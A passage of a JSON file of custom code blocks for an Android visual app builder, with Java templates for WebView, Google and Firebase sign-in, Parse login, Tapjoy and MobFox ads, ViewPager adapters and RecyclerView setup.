int _param3, long _param4) {\r\n\t\t\t\tfinal int pos \u003d _param3;\r\n\t\t\t\t%2$s\n\t\t\t}\r\n\t\t});","name":"ListViewOnClick","palette":"-1","type":"c","spec":"%m.listview onItemClick"},{"code":"pos","name":"pos","palette":"-1","type":"d","spec":"pos"},{"code":"%1$s.getSettings().setAllowFileAccess(true);\n%1$s.getSettings().setJavaScriptEnabled(true);\n%1$s.getSettings().setBuiltInZoomControls(%3$s);\n\nString imagePath \u003d \"file://\"+ %2$s;\nString html \u003d \"\u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003cimg src\u003d\\\"\"+ imagePath + \"\\\"\u003e\u003c/body\u003e\u003c/html\u003e\";\n%1$s.loadDataWithBaseURL(\"\", html, \"text/html\",\"utf-8\", \"\");","name":"WebViewImagePath","palette":"124","type":" ","spec":"%m.WebView SettingsForImagePath %s ZoomControls %b"},{"code":"%1$s.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {\r\n\t@Override\r\n\tpublic boolean onItemLongClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\tfinal int poslongclick \u003d _param3;\r\n\t\t%2$s\n\t\treturn true;\r\n\t}\r\n});","name":"GridViewOnLongClick","palette":"-1","type":"c","spec":"%m.GridView onItemLongClick"},{"code":"poslongclick","name":"poslongclick","palette":"-1","type":"d","spec":"poslongclick"},{"code":"startActivity(new android.content.Intent(android.app.DownloadManager.ACTION_VIEW_DOWNLOADS))","color":"#FF0040FF","name":"","typeName":"","palette":"85","type":" ","spec":"Intent - Open dowloads"},{"code":"GoogleSignInOptions %1$s \u003d new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN).requestIdToken(%2$s).requestEmail().build();","name":"GoogleSignInOptions","palette":"34","type":" ","spec":"GoogleSignInOptions %m.GoogleSignInOptions ID %s"},{"code":"%1$s \u003d GoogleSignIn.getClient(this, %2$s);","name":"GoogleSignInClient","palette":"34","type":" ","spec":"GoogleSignInClient %m.FirebaseGoogleLogin getClient %m.GoogleSignInOptions"},{"code":"%1$s \u003d FirebaseAuth.getInstance();","name":"FirebaseAuth","palette":"34","type":" ","spec":"%m.FirebaseAuth getInstance"},{"code":"Intent signInIntent \u003d %1$s.getSignInIntent();\n\nstartActivityForResult(signInIntent, REQ_CD_%1$S);","name":"PickGoogleAccount","palette":"34","type":" ","spec":"%m.FirebaseGoogleLogin PickGoogleAccount"},{"code":"}\nprivate void firebaseAuthWithGoogle(String idToken) {\nAuthCredential credential \u003d GoogleAuthProvider.getCredential(idToken, null);\n%1$s.signInWithCredential(credential).addOnCompleteListener(this, new OnCompleteListener\u003cAuthResult\u003e() {\n\n@Override\npublic void onComplete(@NonNull Task\u003cAuthResult\u003e task) {\n%2$s\n}\n});\n}\n//[END auth_with_google]\n{","name":"OnStartGoogleSign","palette":"34","type":"c","spec":"OnStartGoogleSign onFirebaseAuth %m.FirebaseAuth"},{"code":"if (task.isSuccessful()) {\n%1$s\n} else {\n%2$s\n}","name":"ifSuccessGoogleAuth","palette":"34","type":"e","spec":"ifSuccessGoogleAuth"},{"code":"%1$s \u003d %2$s.getCurrentUser();","name":"FirebaseUser","palette":"34","type":" ","spec":"FirebaseUser %m.FirebaseUser getCurrentUser %m.FirebaseAuth"},{"code":"%1$s.signOut();\n\n%2$s.signOut().addOnCompleteListener(%3$s.this, new OnCompleteListener\u003cVoid\u003e() {\n\n@Override\n\npublic void onComplete(@NonNull Task\u003cVoid\u003e task) {\n\n%4$s\n\n}\n});","name":"GoogleSignOut","palette":"34","type":"c","spec":"SignOut for %m.FirebaseAuth and %m.GoogleSignInClient at %m.activity"},{"code":"%1$s \u003d %2$s.getCurrentUser();\r\n\t\tif ((FirebaseAuth.getInstance().getCurrentUser() !\u003d null)) {\r\n\t\t\t%3$s\r\n\t\t}\r\n\t\telse {\r\n\t\t\t%4$s\r\n\t\t}","name":"CheckUserLoginOrNot","palette":"34","type":"e","spec":"CheckUser for %m.FirebaseUser and %m.FirebaseAuth ifLogin"},{"code":"%1$s.getPhotoUrl().toString()","name":"UrlImageProfile","typeName":"String","palette":"34","type":"v","spec":"%m.FirebaseUser getImageProfileURL"},{"code":"%1$s.getDisplayName()","name":"UsernameGoogleSign","typeName":"String","palette":"34","type":"v","spec":"%m.FirebaseUser getUsername"},{"code":"try {\n                // Google Sign In was successful, authenticate with Firebase\n                GoogleSignInAccount account \u003d %1$s.getResult(ApiException.class);\n                \n                firebaseAuthWithGoogle(account.getIdToken());\n            } catch (ApiException e) {\n                //On Fiailure\n                final String ErrorOnResultSign \u003d e.getMessage();\n                %2$s\n            }","name":"OnActivityResultGoogleSign","palette":"34","type":"c","spec":"ActivityResultGoogleSign %m.GoogleSignInAccount IfError"},{"code":"ErrorOnResultSign","name":"ErrorOnResultSign","typeName":"String","palette":"34","type":"v","spec":"ErrorOnResultSign"},{"code":"Parse.initialize(new Parse.Configuration.Builder(this)\n      .applicationId(%1$s)\n      .clientKey(%2$s)\n      .server(%3$s)\n      .build()\n    );","name":"ParseInitialize","palette":"35","type":" ","spec":"ParseInitialize appID %s clientID %s serverHost %s"},{"code":"%1$s \u003d new ParseObject(%2$s);","name":"CreateNewParseObject","palette":"35","type":" ","spec":"New ParseObject %m.ParseObject DatabaseName %s"},{"code":"%1$s.put(%2$s , %3$s);","name":"ObjectMap","palette":"35","type":" ","spec":"ParseObject %m.ParseObject put Key %s Value %s"},{"code":"%1$s.saveInBackground(new SaveCallback() {\n    @Override\n    public void done(ParseException e) {\n    %2$s\n    }\n  });","name":"CallBackSaveData","palette":"35","type":"c","spec":"ParseObject %m.ParseObject CallBackSaveData"},{"code":"if ( e !\u003d null ) {\nfinal String ErrorMessage \u003d e.getMessage();\n%1$s\n}","name":"ErrorSaveData","palette":"35","type":"c","spec":"if ErrorSaveData _ErrorMessage"},{"code":"ErrorMessage","name":"ErrorMessage","typeName":"String","palette":"35","type":"v","spec":"ErrorMessage"},{"code":"%1$s.getObjectId()","name":"ParseObject getObjectID","typeName":"String","palette":"35","type":"v","spec":"%m.ParseObject getObjectID"},{"code":"%1$s.setError(null);","name":"ParseSignUpResetError","palette":"35","type":" ","spec":"%m.textview setError null"},{"code":"%1$s \u003d new ParseUser();\n%1$s.setUsername(%2$s);\n%1$s.setEmail(%3$s);\n%1$s.setPassword(%4$s);","name":"ParseUser SignUp","palette":"35","type":" ","spec":"ParseUser %m.ParseUser SignUp userName %s email %s password %s"},{"code":"%1$s.signUpInBackground(new SignUpCallback() {\n@Override\npublic void done(ParseException e) {\n%2$s\n}\n});","name":"SignUpCallBackDone","palette":"35","type":"c","spec":"%m.ParseUser SignUpCallback ifDone"},{"code":"if (e \u003d\u003d null) {\n%1$s\n} else {\nfinal String errorSignUp \u003d e.getMessage();\n%2$s\n}","name":"SignUpCallbackOK","palette":"35","type":"e","spec":"SignUpCallback if Success"},{"code":"ParseUser.logOut();","name":"ParseUserLogOut","palette":"35","type":" ","spec":"ParseUserLogOut"},{"code":"ParseUser.logInInBackground(%1$s, %2$s, new LogInCallback() {\n    @Override\n    public void done(ParseUser parseUser, ParseException e) {\n        if (parseUser !\u003d null) {\n            //Login Success\n            %3$s\n        } else {\n            //Login Failed\n            final String errorLogin \u003d e.getMessage();\n            %4$s\n        }\n    }\n});","name":"ParseUser Login","palette":"35","type":"e","spec":"ParseUserLogin Username %s Password %s if Success"},{"code":"if(parseUser.getBoolean(\"emailVerified\")) {\n    //Email verified\n    %1$s\n}\nelse {\n    //Email not verified\n    %2$s\n}","name":"CheckEmailVerified","palette":"35","type":"e","spec":"if Email Verified"},{"code":"errorLogin","name":"errorLogin","typeName":"String","palette":"35","type":"v","spec":"errorLogin"},{"code":"errorSignUp","name":"errorSignUp","typeName":"String","palette":"35","type":"v","spec":"errorSignUp"},{"code":"%1$s.removeAnimation();","name":"RemoveTypeWriterView","palette":"10","type":" ","spec":"%m.TypeWriterView RemoveAnimation"},{"code":"","color":"#FF558B2F","name":"","typeName":"","palette":"-1","type":"h","spec":"you can use string in textview set text block"},{"code":"int typeFaceNumb \u003d 0;\nfinal String FontTypeCust \u003d \"fonts/\"+\"%2$s\"+\".ttf\";\n\nif (\"%3$s\".equals(\"normal\")){\n    typeFaceNumb \u003d 0;\n}\nelse {\nif (\"%3$s\".equals(\"bold\")){\n    typeFaceNumb \u003d 1;\n}\nelse {\nif (\"%3$s\".equals(\"italic\")){\n    typeFaceNumb \u003d 2;\n}\nelse {\n    typeFaceNumb \u003d 3;\n}\n}\n}\n\n\n%1$s.setTypeface(Typeface.createFromAsset(getAssets(), FontTypeCust), typeFaceNumb);\r\n%1$s.setTextColor(%4$s);\r\n\r\n%1$s.setDelay(%5$s);\r\n%1$s.setWithMusic(%6$s);\r","name":"TypeWriterViewStyle","palette":"10","type":" ","spec":"%m.TypeWriterView font %m.font Style %m.typeface Color %m.color setDelay %d withMusic %b"},{"code":"String TypeWriterViewSTR \u003d %2$s;\n%1$s.animateText(TypeWriterViewSTR);\r","name":"RunAnimTypeWriterView","palette":"10","type":" ","spec":"%m.TypeWriterView RunWithStringValue %s"},{"code":"%1$s \u003d new TypeWriterView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\n%1$s.setTextSize(%3$s);\n%1$s.setGravity(Gravity.%4$S);\n%5$s.addView(%1$s);\r","name":"TypeWriterViewBuild","palette":"10","type":" ","spec":"%m.TypeWriterView at %m.activity TextSize %d Gravity %s.inputOnly addTo %m.view "},{"code":"android.text.util.Linkify.addLinks(%1$s, android.text.util.Linkify.WEB_URLS);","name":"LinkifyTextView","palette":"10","type":" ","spec":"%m.textview setLinkify"},{"code":"final CodeView codeView\u003d(CodeView) _v.findViewById(R.id.codeview);\n\ncodeView.setTheme(CodeViewTheme.%1$s).fillColor();\ncodeView.showCode(%2$s);","name":"CodeView_copy88","palette":"10","type":" ","spec":"CodeView Theme %s.inputOnly setCode %s"},{"code":"Hashtable\u003cString, Object\u003e connectFlags \u003d new Hashtable\u003cString, Object\u003e();\nconnectFlags.put(TapjoyConnectFlag.ENABLE_LOGGING, \"%1$s\");\nconnectFlags.put(TapjoyConnectFlag.DISABLE_ADVERTISING_ID_CHECK, \"%2$s\");\n// remember to turn this off for your production builds!","name":"ConnectFlags","palette":"36","type":" ","spec":"connectFlags ENABLE_LOGGING %b DISABLE_ADVERTISING_ID_CHECK %b"},{"code":"Tapjoy.connect(this.getApplicationContext(), %1$s, connectFlags, new TJConnectListener() {\n\t\t\t@Override\n\t\t\tpublic void onConnectSuccess() {\n\t\t\t\t%2$s\n\t\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onConnectFailure() {\n\t\t\t\t%3$s\n\n\t\t\t}\n\t\t});","name":"TapJoyInitialize","palette":"36","type":"e","spec":"TapJoy SDK_Key %s if Success"},{"code":"Tapjoy.setActivity(this);","name":"TapjoySetActivity","palette":"36","type":" ","spec":"TapjoySetActivity"},{"code":"%1$s \u003d Tapjoy.getPlacement(%2$s, new TJPlacementListener() {\n\t\t\t\n\t\t\t%3$s\n});","name":"TJPlacementListener","palette":"36","type":"c","spec":"%m.TJPlacement placement_ID %s"},{"code":"\t\t\t@Override\n\t\t\tpublic void onRequestSuccess(TJPlacement placement) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnRequestSuccess","palette":"36","type":"c","spec":"TJPlacementOnRequestSuccess() -\u003e"},{"code":"placement.getName()","name":"PlacementGetName","typeName":"String","palette":"36","type":"v","spec":"PlacementGetName"},{"code":"if (!placement.isContentAvailable()) {\n\t\t\t\t\t%1$s\n\t\t\t\t}","name":"IfPlacementNotAvailable","palette":"36","type":"c","spec":"IfPlacementNotAvailable"},{"code":"\t\t\t@Override\n\t\t\tpublic void onRequestFailure(TJPlacement placement, TJError error) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnRequestFailure","palette":"36","type":"c","spec":"TJPlacementOnRequestFailure() -\u003e"},{"code":"error.message","name":"ErrorMessage","typeName":"String","palette":"36","type":"v","spec":"ErrorMessage"},{"code":"\t\t\t@Override\n\t\t\tpublic void onContentReady(TJPlacement placement) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnReadyContent","palette":"36","type":"c","spec":"TJPlacementOnReadyContent() -\u003e"},{"code":"placement.showContent();","name":"PlacementShowContent","palette":"36","type":" ","spec":"PlacementShowContent"},{"code":"\t\t\t@Override\n\t\t\tpublic void onContentShow(TJPlacement placement) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnContentShow","palette":"36","type":"c","spec":"TJPlacementOnContentShow() -\u003e"},{"code":"\t\t\t@Override\n\t\t\tpublic void onContentDismiss(TJPlacement placement) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnContentDismiss","palette":"36","type":"c","spec":"TJPlacementOnContentDissmiss() -\u003e"},{"code":"\t\t\t@Override\n\t\t\tpublic void onPurchaseRequest(TJPlacement placement, TJActionRequest request, String productId) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnPurchaseRequest","palette":"36","type":"c","spec":"TJPlacementOnPurchaseRequest() -\u003e"},{"code":"productId","name":"productId","typeName":"String","palette":"36","type":"v","spec":"productId"},{"code":"\t\t\t@Override\n\t\t\tpublic void onRewardRequest(TJPlacement placement, TJActionRequest request, String itemId, int quantity) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnRewardRequest","palette":"36","type":"c","spec":"TJPlacementOnRewardRequest() -\u003e"},{"code":"itemId","name":"itemId","typeName":"String","palette":"36","type":"v","spec":"itemId"},{"code":"quantity","name":"quantity","typeName":"String","palette":"36","type":"d","spec":"quantity"},{"code":"\t\t\t@Override\n\t\t\tpublic void onClick(TJPlacement placement) {\n\t\t\t%1$s\n     }","name":"TJPlacementOnClick","palette":"36","type":"c","spec":"TJPlacementOnClick() -\u003e"},{"code":"}\nprivate void updateTextInUI(final String statusTapJoy) {\n\t\tString displayText \u003d statusTapJoy;\n\n\t\trunOnUiThread(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tif (ket !\u003d null) {\n\t\t\t\t\t%1$s\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n{","name":"OnUI_Update","palette":"36","type":"c","spec":"OnUI_Update"},{"code":"statusTapJoy","name":"statusTapJoy","typeName":"String","palette":"36","type":"v","spec":"statusTapJoy"},{"code":"updateTextInUI(%1$s);","name":"UpdateTextInUI","palette":"36","type":" ","spec":"UpdateTextInUI %s"},{"code":"Tapjoy.onActivityStart(this);","name":"TapJoyOnStart","palette":"36","type":" ","spec":"TapJoyOnStart"},{"code":"Tapjoy.onActivityStop(this);","name":"TapJoyOnStop","palette":"36","type":" ","spec":"TapJoyOnStop"},{"code":"if(Tapjoy.isConnected()) {\n    %1$s.requestContent();\n} else {\n    %2$s\n}","name":"ClickRequestContent","palette":"36","type":"c","spec":"ClickRequestContent forPlacement %m.TJPlacement ifERROR"},{"code":"MobfoxSDK.init(this);","name":"MobfoxSDK_init","palette":"37","type":" ","spec":"MobfoxSDK_init"},{"code":"%1$s \u003d MobfoxSDK.createBanner(%2$s.this, %3$s, %4$s, %5$s, new MobfoxSDK.MFXBannerListener() {\n       %6$s\n   });\n ","name":"MobFoxBannerListener","palette":"37","type":"c","spec":"%m.MobfoxSDK.MFXBanner at %m.activity SizeWidth %s.inputOnly SizeHeight %s.inputOnly HashBanner %s"},{"code":"\n       @Override\n       public void onBannerLoadFailed(MobfoxSDK.MFXBanner mfxBanner, String s) {\n           final String MFXbannerErrorLoad \u003d s;\n           %1$s\n       }","name":"OnBannerFailedLoad","palette":"37","type":"c","spec":"OnBannerFailedLoad"},{"code":"MFXbannerErrorLoad","name":"MFXbannerErrorLoad","typeName":"String","palette":"37","type":"v","spec":"MFXbannerErrorLoad"},{"code":"\n       @Override\n       public void onBannerLoaded(MobfoxSDK.MFXBanner mfxBanner) {\n           Log.d(\"MobFoxLog\", \"banner loaded\");\n \n           //A loaded banner is added to your placeholder\n           \n           MobfoxSDK.addBannerViewTo(mBannerAd, %1$s);\n          %2$s\n\n       }","name":"MFXBannerLoaded","palette":"37","type":"c","spec":"MFXBannerLoaded InflateAdsTo %m.view"},{"code":"\n       @Override\n       public void onBannerShown(MobfoxSDK.MFXBanner mfxBanner) {\n       %1$s\n       }","name":"MFXonBannerShow","palette":"37","type":"c","spec":"MFXonBannerShow"},{"code":" \n       @Override\n       public void onBannerClosed(MobfoxSDK.MFXBanner mfxBanner) {\n       %1$s\n       }","name":"MFXonBannerClose","palette":"37","type":"c","spec":"MFXonBannerClose"},{"code":"       @Override\n       public void onBannerFinished(MobfoxSDK.MFXBanner mfxBanner) {\n       %1$s\n       }","name":"MFXonBannerFinished","palette":"37","type":"c","spec":"MFXonBannerFinished"},{"code":"\n       @Override\n       public void onBannerClicked(MobfoxSDK.MFXBanner mfxBanner, String s) {\n       %1$s\n       }","name":"MFXonBannerClicked","palette":"37","type":"c","spec":"MFXonBannerClicked"},{"code":"MobfoxSDK.loadBanner(%1$s);","name":"MobFoxBannerLoad","palette":"37","type":" ","spec":"%m.MobfoxSDK.MFXBanner Load"},{"code":"MobfoxSDK.onResume(this);","name":"MFXonResume","palette":"37","type":" ","spec":"MFXonResume"},{"code":"MobfoxSDK.onPause(this);","name":"MFXonPause","palette":"37","type":" ","spec":"MFXonPause"},{"code":"if (MobfoxSDK.onBackPressed(this))\n{\nreturn;\n}","name":"MFXonBackPress","palette":"37","type":" ","spec":"MFXonBackPress"},{"code":"MobfoxSDK.setCOPPA(%1$s);","name":"MobfoxSDK_setCOPPA","palette":"37","type":" ","spec":"MobfoxSDK_setCOPPA %b"},{"code":"%1$s.setAdapter(new ViewPagerAdapter(%2$s.this, %3$s));","name":"ViewPagerOnCreate","palette":"38","type":" ","spec":"%m.ViewPager at %m.activity data %s.inputOnly"},{"code":"List\u003cInteger\u003e %1$s \u003d new ArrayList\u003c\u003e();","name":"List_IntegerAdd","palette":"38","type":" ","spec":"Create List\u003cInteger\u003e name %s.inputOnly"},{"code":"%1$s.add(R.drawable.%2$s);","name":"AddImageToInteger","palette":"38","type":" ","spec":"Integer %s.inputOnly add ImageDrawable %m.resource"},{"code":"protected class ViewPagerAdapter extends PagerAdapter {\n        private List\u003cInteger\u003e imageList;\n        private Context context;\n\n        ViewPagerAdapter(Context context, List\u003cInteger\u003e %1$s) {\n            this.context \u003d context;\n            imageList \u003d %1$s;\n\n        }\n\n        @Override\n        public int getCount() {\n            return imageList.size();\n        }\n\n        @Override\n        public boolean isViewFromObject(View view, Object object) {\n            return view \u003d\u003d object;\n        }\n\n        @Override\n        public Object instantiateItem(ViewGroup container, int position) {\n            LayoutInflater inflater \u003d LayoutInflater.from(context);\n            ViewGroup layout \u003d (ViewGroup) inflater.inflate(R.layout.%2$s, container,\n                    false);\n            ImageView imageView \u003d layout.findViewById(R.id.%3$s);\n            TextView %4$s \u003d layout.findViewById(R.id.%4$s);\n            imageView.setImageResource(imageList.get(position));\n            %5$s\n\n            container.addView(layout);\n            return layout;\n        }\n\n        @Override\n        public void destroyItem(ViewGroup container, int position, Object object) {\n            container.removeView((View) object);\n        }\n    }\n    \n    \n","name":"AdapterImageAndText","palette":"38","type":"c","spec":"Adapter data %s.inputOnly customLayout %s.inputOnly ImageView_ID %s.inputOnly TextView_ID %s.inputOnly"},{"code":"position","name":"position","palette":"38","type":"d","spec":"position"},{"code":"protected class ViewPagerAdapter extends PagerAdapter {\n        private List\u003cString\u003e dataList;\n        private Context context;\n\n        ViewPagerAdapter(Context context, List\u003cString\u003e %1$s) {\n            this.context \u003d context;\n            dataList \u003d %1$s;\n\n        }\n\n        @Override\n        public int getCount() {\n            return dataList.size();\n        }\n\n        @Override\n        public boolean isViewFromObject(View view, Object object) {\n            return view \u003d\u003d object;\n        }\n\n        @Override\n        public Object instantiateItem(ViewGroup container, int position) {\n            LayoutInflater inflater \u003d LayoutInflater.from(context);\n            ViewGroup layout \u003d (ViewGroup) inflater.inflate(R.layout.%2$s, container,\n                    false);\n            LottieAnimationView lottieView \u003d layout.findViewById(R.id.%3$s);\n            TextView %4$s \u003d layout.findViewById(R.id.%4$s);\n            \n            \n            lottieView.setAnimation(dataList.get(position));\n            lottieView.setRepeatCount(-1);\r\n\t\t    lottieView.setRepeatMode(com.airbnb.lottie.LottieDrawable.RESTART);\r\n\t\t    lottieView.playAnimation();\n            \n            \n            \n            %5$s\n\n            container.addView(layout);\n            return layout;\n        }\n\n        @Override\n        public void destroyItem(ViewGroup container, int position, Object object) {\n            container.removeView((View) object);\n        }\n    }\n    \n    \n","name":"AdapterLottieAndText","palette":"38","type":"c","spec":"Adapter data %s.inputOnly customLayout %s.inputOnly Lottie_ID %s.inputOnly TextView_ID %s.inputOnly"},{"code":"List\u003cString\u003e %1$s \u003d new ArrayList\u003c\u003e();","name":"List_StringAdd","palette":"38","type":" ","spec":"Create List\u003cString\u003e name %s.inputOnly"},{"code":"%1$s.add(%2$s);","name":"AddDataToListString","palette":"38","type":" ","spec":"ListString %s.inputOnly add Data %s"},{"code":"%1$SAdapter %2$s \u003d new %1$SAdapter();\n%1$s.setAdapter(%2$s);","name":"ViewPagerSetAdapter","palette":"38","type":" ","spec":"ViewPager %m.ViewPager setAdapter %s.inputOnly"},{"code":"%1$s.setCurrentItem(%2$s);","name":"ViewPagerSetCurrentItem","palette":"38","type":" ","spec":"ViewPager %m.ViewPager setCurrentItem %d"},{"code":"\n\t\t%1$s.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {\n\t\t    %2$s\n\t\t});","name":"VPOnPageChangeListener","palette":"38","type":"c","spec":"%m.ViewPager OnPageChangeListener"},{"code":"\n\t\t    public void onPageSelected(int position) {\n\t\t        %1$s\n\t\t    }\n\t\t\n\t\t      @Override\n\t\t      public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {\n\t\t    }\n\t\t      @Override\n\t\t      public void onPageScrollStateChanged(int state) {\n\t\t    }","name":"VPonPageSelected","palette":"38","type":"c","spec":"ViewPager onPageSelected position"},{"code":"position","name":"position","palette":"38","type":"d","spec":"position"},{"code":"\n\t\t}\n\t\t\n\t\tprivate class %1$SAdapter extends PagerAdapter {\n\t\t     public int getCount() {\n\t\t     return %2$s;\n\t\t     }\n\t\t     %3$s\n\t\t     @Override\n\t\t     public boolean isViewFromObject(View arg0, Object arg1) {\n\t\t         return arg0 \u003d\u003d ((View) arg1);\n\t\t     }\n\t\t     @Override\n\t\t     public Parcelable saveState() {\n\t\t         return null;\n\t\t     }\n\t\t}\n\t\t\n\t\tprivate void foo() {","name":"ViewPagerClassAdapter","palette":"38","type":"c","spec":"%m.ViewPager classAdapter CountPage %d"},{"code":"\n\t\t     @Override\n\t\t     public Object instantiateItem(ViewGroup collection, int position) {\n\t\t\t     LayoutInflater inflater \u003d (LayoutInflater) getBaseContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n\t\t\t     View v \u003d inflater.inflate(R.layout.%1$s, null);\n\t\t\t     LinearLayout container \u003d (LinearLayout) v.findViewById(R.id.linear1);\n\t\t\t     %2$s\n\t\t\t     collection.addView(v, 0);\n\t\t\t     return v;\n\t\t     }","name":"ObjectInstantiateItem","palette":"38","type":"c","spec":"ObjectInstantiateItem inflaterLayout %s.inputOnly"},{"code":"\n\t\t\t\t     ViewGroup parent \u003d (ViewGroup) %1$s.getParent();\n\t\t\t\t     if (parent !\u003d null) {\n\t\t\t\t\t     parent.removeView(%1$s);\n\t\t\t\t     }\n\t\t\t\t     container.addView(%1$s);","name":"AddViewToInflater","palette":"38","type":" ","spec":"AddView %m.view"},{"code":"\n\t\t     @Override public void destroyItem(ViewGroup collection, int position, Object view) {\n\t\t\t     collection.removeView((View) view);\n\t\t\t     %1$s.addView((View) view);\n\t\t     }","name":"onDestroyItem","palette":"38","type":" ","spec":"onDestroyItem trashLayout %m.view"},{"code":"\n\t\t     @Override public CharSequence getPageTitle(int position) {\n\t\t\t     switch (position) {\n\t\t\t\t     %1$s\n\t\t\t\t     default:\n\t\t\t\t     return null;\n\t\t\t     }\n\t\t     }","name":"CharSequenceGetPageTitle","palette":"38","type":"c","spec":"CharSequence getPageTitle"},{"code":"\n\t\t\t\t     case %1$s:\n\t\t\t\t     return %2$s;","name":"CaseTitleName","palette":"38","type":" ","spec":"Case %d ReturnName %s"},{"code":"final SpannableString spannedDesc \u003d new SpannableString(%1$s);","name":"CreateTapTarget","palette":"39","type":" ","spec":"CreateTapTarget message %s"},{"code":"spannedDesc.setSpan(new android.text.style.UnderlineSpan(), spannedDesc.length() - %1$s.length(), spannedDesc.length(), 0);","name":"SpanTitle","palette":"39","type":" ","spec":"SpanTitle %s"},{"code":"TapTargetView.showFor(%1$s.this, TapTarget.forView(findViewById(R.id.%2$s), %3$s, spannedDesc)\n        .cancelable(%4$s)\n        .drawShadow(%5$s)\n        .titleTextDimen(R.dimen.title_text_size)\n        .tintTarget(%6$s), new TapTargetView.Listener() {\n      %7$s\n});","name":"TapTargetConfig","palette":"39","type":"c","spec":"ConfigTarget %m.activity targetView %m.view Title %s Cancelable %b Shadow %b tintTarget %b"},{"code":"      @Override\n      public void onTargetClick(TapTargetView view) {\n        super.onTargetClick(view);\n        // .. which evidently starts the sequence we defined earlier\n        %1$s\n        \n      }","name":"onTargetClick","palette":"39","type":"c","spec":"onTargetClick"},{"code":"      @Override\n      public void onOuterCircleClick(TapTargetView view) {\n        super.onOuterCircleClick(view);\n        %1$s\n      }","name":"onTargetOutsetClick","palette":"39","type":"c","spec":"onTargetOutsetClick"},{"code":"      @Override\n      public void onTargetDismissed(TapTargetView view, boolean userInitiated) {\n        Log.d(\"TapTargetViewSample\", \"You dismissed me :(\");\n        %1$s\n      }","name":"onTargetDismiss","palette":"39","type":"c","spec":"onTargetDismiss"},{"code":"%1$s.setRadius((int)%2$s);\n%1$s.setPadding((int)%3$s,(int)%3$s,(int)%3$s,(int)%3$s);","name":"CardViewCornerRadius","palette":"40","type":" ","spec":"%m.CardView setCornerRadius %d setPadding %d"},{"code":"%1$s.setCardBackgroundColor(%2$s);\n%1$s.setMaxCardElevation((int)%3$s);","name":"CardViewBackground","palette":"40","type":" ","spec":"%m.CardView setBackgroundColor %m.color setElevation %d"},{"code":"Uri %1$s \u003d Uri.parse(%2$s);","name":"StringToUri","palette":"41","type":" ","spec":"Create Uri %s.inputOnly from String %s"},{"code":"MediaController %1$s \u003d new MediaController(%2$s.this);","name":"MediaController","palette":"41","type":" ","spec":"MediaController %s.inputOnly at %m.activity"},{"code":"%1$s.setVideoURI(%2$s);","name":"VideoViewLoad","palette":"41","type":" ","spec":"%m.VideoView loadFromUri %m.Uri"},{"code":"%1$s","name":"Uri","typeName":"Uri","palette":"41","type":"v","spec":"UriName %s.inputOnly"},{"code":"%1$s.seekTo((int)%2$s);","name":"VideoSeek","palette":"41","type":" ","spec":"%m.VideoView seekTo %d"},{"code":"%1$s.setMediaController(%2$s);","name":"SetMediaController","palette":"41","type":" ","spec":"%m.VideoView setMediaController %m.MediaController"},{"code":"%1$s","name":"mediaController","typeName":"MediaController","palette":"41","type":"v","spec":"MediaControllerName %s.inputOnly"},{"code":"%1$s.start();","name":"StartVideoPlay","palette":"41","type":" ","spec":"%m.VideoView Start"},{"code":"%1$s \u003d new RecyclerView(%2$s.this);\n%1$s.setLayoutParams(new ViewGroup.LayoutParams( ViewGroup.LayoutParams.%3$S, ViewGroup.LayoutParams.%4$S));","name":"CreateRecyclerview","palette":"42","type":" ","spec":"%m.RecyclerView at %m.activity Width %s.inputOnly Height %s.inputOnly"},{"code":"%1$s","name":"RecyclerView","typeName":"RecyclerView","palette":"42","type":"v","spec":"%s.inputOnly RecyclerView"},{"code":"%1$s %2$s \u003d new %1$s(%4$s, %3$s.this);","name":"AdapterRecyclerView","palette":"42","type":" ","spec":"Adapter %s.inputOnly name %s.inputOnly at %m.activity dataList %m.list"},{"code":"%1$s.setAdapter(%2$s);","name":"RecyclerViewSetAdapter","palette":"42","type":" ","spec":"%m.RecyclerView setAdapterName %s.inputOnly"},{"code":"%1$s","name":"ListCustome","typeName":"List","palette":"42","type":"v","spec":"%s.inputOnly List"},{"code":"%1$s.setLayoutManager(new LinearLayoutManager(%2$s.this));","name":"RecyclerviewLayoutManager","palette":"42","type":" ","spec":"%m.RecyclerView LayoutManager at %m.activity"},{"code":"public class %1$s extends RecyclerView.Adapter\u003cRecyclerView.%2$s\u003e {\n    %3$s\n}","name":"ClassAdapterRecyclerView","palette":"42","type":"c","spec":"ClassRecyclerViewAdapter %s.inputOnly viewHolderName %s.inputOnly"},{"code":"private Context context;","name":"PrivateContext","palette":"42","type":" ","spec":"PrivateContext"},{"code":"private List\u003c%1$s\u003e %2$s;","name":"PrivateArrayList","palette":"42","type":" ","spec":"ArrayList fromClassList %s.inputOnly namaList %s.inputOnly"},{"code":"    public %1$s(Context context, List\u003c%2$s\u003e %3$s) {\n        this.%3$s \u003d %3$s;\n        this.context \u003d context;\n        %4$s\n    }","name":"AdapterSetData","palette":"42","type":"c","spec":"Adapter %s.inputOnly ClassList %s.inputOnly listName %s.inputOnly"},{"code":"    //ViewHolder Digunakan Untuk Menyimpan Referensi Dari View-View\n    public class %1$s extends RecyclerView.ViewHolder{\n\n        %2$s\n    }","name":"ClassViewHolder","palette":"42","type":"c","spec":"ClassViewHolder %s.inputOnly extendRecyclerViewHolder"},{"code":"private TextView %1$s;","name":"PrivateTextViewWidget","palette":"42","type":" ","spec":"PrivateTextView %s.inputOnly"},{"code":"private LinearLayout %1$s;","name":"PrivateLinearLayoutWidget","palette":"42","type":" ","spec":"PrivateLinearLayout 